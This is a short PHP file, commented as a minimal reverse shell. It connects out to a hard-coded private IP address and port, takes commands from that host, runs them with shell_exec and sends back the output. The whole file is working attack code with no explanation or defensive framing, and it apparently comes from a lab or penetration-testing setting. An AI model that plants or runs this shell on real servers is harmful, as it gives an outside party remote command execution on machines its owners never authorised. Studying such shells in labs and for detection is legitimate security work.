<?php
// super minimal PHP rev shell
$ip = '172.16.133.1';
$port = 4443;

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit("Connection failed: $errstr ($errno)\n");
}

while (true) {
    fwrite($sock, "PHP Shell > ");
    $cmd = trim(fgets($sock, 4096));
    if ($cmd === 'exit' || $cmd === 'quit') break;

    // Windows-safe execution
    $output = shell_exec($cmd . " 2>&1");
    if ($output === null) {
        $output = "Command failed or returned nothing.\n";
    }

    fwrite($sock, $output);
}
fclose($sock);
?>
